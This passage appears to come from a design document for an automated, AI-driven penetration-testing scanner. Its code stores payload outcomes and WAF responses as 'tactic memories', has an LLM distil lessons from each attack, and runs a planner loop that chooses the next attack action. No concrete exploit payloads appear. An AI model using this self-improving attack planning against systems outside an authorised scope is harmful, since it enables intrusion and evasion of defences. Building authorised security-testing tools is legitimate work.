        # Compute similarity hash to find existing memories
        similarity_key = self._compute_similarity_key(tactic_type, tech_stack, payload_used)

        existing = await self._find_by_similarity_key(similarity_key)

        if existing:
            # Reinforce — increase confidence, update lesson if outcome differs
            await self._reinforce_memory(
                memory_id=existing["memory_id"],
                outcome=outcome,
                new_lesson=lesson.lesson,
                new_recommendation=lesson.recommendation,
            )
        else:
            # Create new memory
            async with get_session() as session:
                await session.execute(text("""
                    INSERT INTO tactic_memories (
                        memory_id, tactic_type, tech_stack, payload_used,
                        endpoint_pattern, outcome, waf_response_pattern,
                        success_indicator, lesson, recommendation, avoid_if,
                        program_type, confidence, confirmation_count,
                        similarity_key, created_at, updated_at
                    ) VALUES (
                        :memory_id, :tactic_type, :tech_stack, :payload_used,
                        :endpoint_pattern, :outcome, :waf_response_pattern,
                        :success_indicator, :lesson, :recommendation, :avoid_if,
                        :program_type, :confidence, 1,
                        :similarity_key, NOW(), NOW()
                    )
                """), {
                    "memory_id": str(uuid4()),
                    "tactic_type": tactic_type,
                    "tech_stack": tech_stack,
                    "payload_used": payload_used[:500] if payload_used else "",
                    "endpoint_pattern": endpoint_pattern,
                    "outcome": outcome,
                    "waf_response_pattern": waf_response,
                    "success_indicator": success_indicator,
                    "lesson": lesson.lesson,
                    "recommendation": lesson.recommendation,
                    "avoid_if": lesson.avoid_if,
                    "program_type": program_type,
                    "confidence": 0.5 if outcome == "success" else 0.4,
                    "similarity_key": similarity_key,
                })
            log.info("memory_created", tactic=tactic_type, outcome=outcome)

    async def _reinforce_memory(
        self,
        memory_id: str,
        outcome: str,
        new_lesson: str,
        new_recommendation: str,
    ) -> None:
        """
        Reinforce an existing memory — increase confidence and confirmation count.
        Confidence grows logarithmically: 0.5 → 0.65 → 0.75 → 0.82 → 0.87...
        This prevents any single memory from becoming too authoritative.
        """
        import math
        async with get_session() as session:
            # Get current state
            row = await session.execute(
                text("SELECT confidence, confirmation_count FROM tactic_memories WHERE memory_id = :id"),
                {"id": memory_id}
            )
            current = row.fetchone()
            if not current:
                return

            current_confidence, current_count = current
            new_count = current_count + 1

            # Logarithmic confidence growth with outcome weighting
            if outcome == "success":
                new_confidence = min(0.95, 1 - (1 / (1 + math.log(new_count + 1))))
            else:
                # Failure reduces confidence slightly
                new_confidence = max(0.1, current_confidence * 0.95)

            await session.execute(text("""
                UPDATE tactic_memories SET
                    confirmation_count = :count,
                    confidence = :confidence,
                    lesson = :lesson,
                    recommendation = :recommendation,
                    updated_at = NOW()
                WHERE memory_id = :id
            """), {
                "count": new_count,
                "confidence": new_confidence,
                "lesson": new_lesson,
                "recommendation": new_recommendation,
                "id": memory_id,
            })
        log.info("memory_reinforced", memory_id=memory_id,
                 new_confidence=new_confidence, confirmation_count=new_count)

    def _compute_similarity_key(
        self,
        tactic_type: str,
        tech_stack: list[str],
        payload: str,
    ) -> str:
        """
        Compute a hash that identifies 'similar' tactic attempts.
        Payload is truncated to 50 chars so minor variations don't create duplicates.
        Tech stack is sorted so order doesn't matter.
        """
        normalized = "|".join([
            tactic_type.lower(),
            ",".join(sorted(t.lower() for t in tech_stack)),
            (payload or "")[:50].lower(),
        ])
        return hashlib.sha256(normalized.encode()).hexdigest()[:32]

    async def _find_by_similarity_key(self, key: str) -> dict | None:
        async with get_session() as session:
            row = await session.execute(
                text("SELECT memory_id, confidence, confirmation_count "
                     "FROM tactic_memories WHERE similarity_key = :key LIMIT 1"),
                {"key": key}
            )
            r = row.fetchone()
            return dict(r._mapping) if r else None

    async def _synthesize_lesson(
        self,
        tactic_type: str,
        tech_stack: list[str],
        payload: str,
        outcome: str,
        waf_response: str | None,
    ) -> LessonSynthesis:
        """Ask the LLM to extract a lesson from this outcome."""
        try:
            response = ollama.chat(
                model="llama3.1:8b",
                messages=[{"role": "user", "content": f"""
A penetration test action just completed. Extract a reusable lesson.

TACTIC: {tactic_type}
TECH STACK: {', '.join(tech_stack)}
PAYLOAD: {(payload or '')[:200]}
OUTCOME: {outcome}
SERVER/WAF RESPONSE: {waf_response or 'N/A'}

Respond in JSON:
{{
  "lesson": "one sentence — what was learned that applies generally",
  "recommendation": "concrete action to take next time this exact situation occurs",
  "avoid_if": "specific condition where this tactic should be skipped, or null",
  "generalizable": true|false
}}
"""}],
                format=LessonSynthesis.model_json_schema(),
                options={"temperature": 0},
            )
            return LessonSynthesis.model_validate_json(response["message"]["content"])
        except Exception as e:
            log.warning("lesson_synthesis_failed", error=str(e))
            return LessonSynthesis(
                lesson=f"Tactic {tactic_type} resulted in {outcome}",
                recommendation=f"Retry {tactic_type} if outcome was success, avoid if blocked",
                avoid_if=None,
                generalizable=True,
            )


class MemoryReader:
    """Reads tactic memories for use by the attack planner."""

    async def get_memories_for_tech_stack(
        self,
        tech_stack: list[str],
        limit: int = 10,
    ) -> list[dict]:
        """
        Retrieve the most relevant and reliable memories for the current tech stack.
        Uses PostgreSQL array overlap to find memories with matching tech keywords.
        """
        async with get_session() as session:
            rows = await session.execute(text("""
                SELECT
                    memory_id, tactic_type, tech_stack, outcome,
                    lesson, recommendation, avoid_if, confidence,
                    confirmation_count, waf_response_pattern
                FROM tactic_memories
                WHERE tech_stack && :tech          -- array overlap
                  AND confidence > 0.4
                ORDER BY
                    confirmation_count DESC,       -- prefer well-confirmed memories
                    confidence DESC
                LIMIT :limit
            """), {"tech": tech_stack, "limit": limit})
            return [dict(r._mapping) for r in rows.fetchall()]

    async def get_memories_for_tactic(
        self,
        tactic_type: str,
        tech_stack: list[str],
        limit: int = 5,
    ) -> list[dict]:
        """Retrieve memories for a specific tactic type."""
        async with get_session() as session:
            rows = await session.execute(text("""
                SELECT
                    memory_id, outcome, lesson, recommendation,
                    avoid_if, confidence, waf_response_pattern, payload_used
                FROM tactic_memories
                WHERE tactic_type = :tactic
                  AND (tech_stack && :tech OR array_length(tech_stack, 1) = 0)
                  AND confidence > 0.3
                ORDER BY confidence DESC, confirmation_count DESC
                LIMIT :limit
            """), {"tactic": tactic_type, "tech": tech_stack, "limit": limit})
            return [dict(r._mapping) for r in rows.fetchall()]

    async def get_avoid_tactics(self, tech_stack: list[str]) -> list[str]:
        """
        Return list of tactic types that should be avoided for this tech stack
        based on past experiences. Used by the planner to skip known-bad approaches.
        """
        async with get_session() as session:
            rows = await session.execute(text("""
                SELECT DISTINCT tactic_type
                FROM tactic_memories
                WHERE tech_stack && :tech
                  AND outcome IN ('blocked', 'false_positive')
                  AND confidence > 0.6
                  AND avoid_if IS NOT NULL
            """), {"tech": tech_stack})
            return [r[0] for r in rows.fetchall()]
```

---

### 2.8 Database Schema Addition

```sql
-- Add to a new migration: 010_intelligence_memory.py

CREATE TABLE tactic_memories (
    memory_id               UUID PRIMARY KEY,
    tactic_type             VARCHAR NOT NULL,
    tech_stack              TEXT[] NOT NULL DEFAULT '{}',
    payload_used            TEXT,
    endpoint_pattern        VARCHAR,
    outcome                 VARCHAR NOT NULL CHECK (outcome IN ('success', 'blocked', 'false_positive', 'timeout', 'error')),
    waf_response_pattern    TEXT,
    success_indicator       TEXT,
    lesson                  TEXT NOT NULL,
    recommendation          TEXT,
    avoid_if                TEXT,
    program_type            VARCHAR,
    confidence              FLOAT DEFAULT 0.5 CHECK (confidence >= 0 AND confidence <= 1),
    confirmation_count      INTEGER DEFAULT 1 CHECK (confirmation_count >= 1),
    similarity_key          VARCHAR(32),     -- used to find duplicate/similar memories
    generalizable           BOOLEAN DEFAULT TRUE,
    created_at              TIMESTAMPTZ DEFAULT NOW(),
    updated_at              TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX ix_memories_tactic        ON tactic_memories(tactic_type);
CREATE INDEX ix_memories_tech_stack    ON tactic_memories USING gin(tech_stack);
CREATE INDEX ix_memories_outcome       ON tactic_memories(outcome);
CREATE INDEX ix_memories_confidence    ON tactic_memories(confidence DESC);
CREATE INDEX ix_memories_similarity    ON tactic_memories(similarity_key);

-- Also add similarity_key column to nuclei_template_index (see 1.5.1)
ALTER TABLE nuclei_template_index ADD COLUMN IF NOT EXISTS similarity_key VARCHAR(32);
```

---

### 2.9 Intelligence Loop Integration in scan_task.py

```python
# core_engine/scan_task.py — updated _execute_pipeline with intelligence loop

async def _execute_intelligent_pipeline(
    ctx: ScanContext,
    scan_result: ScanResult,
    repo: ScanRepository,
    publisher,
    config,
) -> None:
    """
    Intelligence-driven pipeline. Baseline recon always runs first,
    then the AI planner takes over for the remainder of the scan budget.
    """
    from backend.services.core_engine.intelligence.attack_planner import AttackPlanner
    from backend.services.core_engine.intelligence.stage_executor import StageExecutor
    from backend.services.core_engine.intelligence.memory import MemoryReader, MemoryWriter
    from backend.services.core_engine.intelligence.profile_utils import (
        build_asset_profiles, update_asset_profiles_from_action, run_baseline_recon
    )
    from backend.services.core_engine.pipeline.scope_filter import ScopeFilter

    scope_filter = ScopeFilter(ctx.scope)
    memory_reader = MemoryReader()
    memory_writer = MemoryWriter()
    planner = AttackPlanner(config, memory_reader)
    executor = StageExecutor(config, scope_filter)

    MAX_ITERATIONS = getattr(config, "planner_max_iterations", 20)
    MIN_CONFIDENCE = getattr(config, "planner_min_confidence", 0.4)

    # ── Phase 1: Baseline Recon (always runs, fixed order) ─────────────────
    try:
        await run_baseline_recon(ctx, scan_result, repo, config)
        await repo.save_endpoints(ctx.scan_id, scan_result.endpoints)
        for js in scan_result.js_assets:
            await repo.save_js_asset(ctx.scan_id, js)
    except Exception as e:
        scan_result.stage_errors["baseline_recon"] = str(e)
        log.error("baseline_recon_failed", scan_id=ctx.scan_id, error=str(e))
        # Cannot continue without assets
        await aggregator.run(ctx, scan_result, repo, publisher)
        return

    if not scan_result.assets:
        log.warning("no_assets_discovered", scan_id=ctx.scan_id)
        await aggregator.run(ctx, scan_result, repo, publisher)
        return

    # Build initial asset profiles after baseline
    profiles = build_asset_profiles(scan_result, ctx)

    # ── Phase 2: Standard Stage 4+5+6 Run ──────────────────────────────────
    # Run the standard nuclei + web vuln + JS secret scans to build
    # an initial findings picture for the planner to reason about
    from backend.services.core_engine.pipeline import (
        nuclei_scan, web_vuln_tests, js_secrets
    )

    nuclei_task = asyncio.create_task(
        nuclei_scan.run(ctx, scan_result.assets, scope_filter, config)
    )
    web_task = asyncio.create_task(
        web_vuln_tests.run(ctx, scan_result.endpoints, scope_filter, ctx.feature_flags)
    )
    nuclei_findings, web_findings = await asyncio.gather(
        nuclei_task, web_task, return_exceptions=True
    )

    if not isinstance(nuclei_findings, Exception):
        scan_result.finding_candidates.extend(nuclei_findings)
    if not isinstance(web_findings, Exception):
        scan_result.finding_candidates.extend(web_findings)

    js_findings = await js_secrets.run(ctx, scan_result.js_assets)
    scan_result.finding_candidates.extend(js_findings)

    # ── Phase 3: Intelligence Loop ──────────────────────────────────────────
    completed_actions: list[str] = ["nuclei_scan", "web_vuln_tests", "js_secrets"]
    failed_actions: dict[str, str] = {}

    for iteration in range(MAX_ITERATIONS):
        ctx.planner_iteration = iteration
        profiles = build_asset_profiles(scan_result, ctx)

        plan = await planner.plan_next_action(
            ctx=ctx,
            current_findings=scan_result.finding_candidates,
            asset_profiles=profiles,
            completed_actions=completed_actions,
            failed_actions=failed_actions,
        )

        if plan.confidence < MIN_CONFIDENCE:
            log.info("planner_converged",
                     scan_id=ctx.scan_id,
                     iteration=iteration,
                     reason=plan.reasoning)
            break

        log.info("planner_executing_action",
                 scan_id=ctx.scan_id,
                 iteration=iteration,
                 action=plan.action_type,
                 target=plan.target_asset,
                 confidence=plan.confidence)

        result = await executor.execute(plan, ctx)
        scan_result.finding_candidates.extend(result.new_findings)
        completed_actions.append(f"{plan.action_type}:{plan.target_asset}")
        update_asset_profiles_from_action(scan_result, result, ctx)

        # Write memory for this outcome
        outcome = "blocked" if result.was_blocked else (
            "success" if result.new_findings else "no_result"
        )
        tech_stack = []
        profile = ctx.asset_profiles.get(plan.target_asset)
        if profile:
            tech_stack = profile.technology_stack.get("technologies", [])

        await memory_writer.record_outcome(
            tactic_type=plan.action_type,
            tech_stack=tech_stack,
            payload_used=plan.specific_payload or "",
            endpoint_pattern=plan.target_endpoint or "",
            outcome=outcome,
            waf_response=result.block_reason,
            success_indicator=plan.expected_outcome if result.new_findings else None,
            program_type=getattr(ctx, "platform", "unknown"),
        )

        if result.was_blocked and result.block_reason:
            failed_actions[f"{plan.action_type}:{plan.target_endpoint}"] = result.block_reason

    # ── Phase 4: Aggregation ────────────────────────────────────────────────
    await aggregator.run(ctx, scan_result, repo, publisher)
```

---

### 2.10 Milestone Mapping

| Capability | Prerequisite | Milestone |
|---|---|---|
| Nuclei template indexer (SQLite) | None | Add to M3 Stage 4 immediately |
| Nuclei template indexer (Postgres) | M3 DB | M3.5 |
| Stage 4b CVE relevance routing | M3 complete | M3.5 |
| NVD version-aware filtering | Stage 4b | M4 or M5 |
| `AssetProfile` and `ScanContext` extensions | M3 | M3.5 |
| `MemoryWriter` + `tactic_memories` table | M5 (needs verified findings) | M7.5 |
| `MemoryReader` injected into planner | Memory system | M7.5 |
| Attack planner (ReAct loop) | M7.5 (needs memory baseline) | M10 |
| `StageExecutor` dispatcher | Attack planner | M10 |
| Chain executor | M8 (exploit chains) | M10 |
| Intelligence loop replacing fixed pipeline | All above | M10 or M11 |
| AI-synthesized CVE detection | M10 AI worker | M10 |

> **Highest ROI first:** Stage 4b CVE relevance routing delivers the most immediate improvement with the least risk. It requires only adding the indexer script and the per-asset template selection logic — nuclei itself doesn't change. Do this during M3.5 before building anything else. The intelligence layer and memory system require verified findings (M7) to train meaningful memories, so they should not be built before that foundation exists.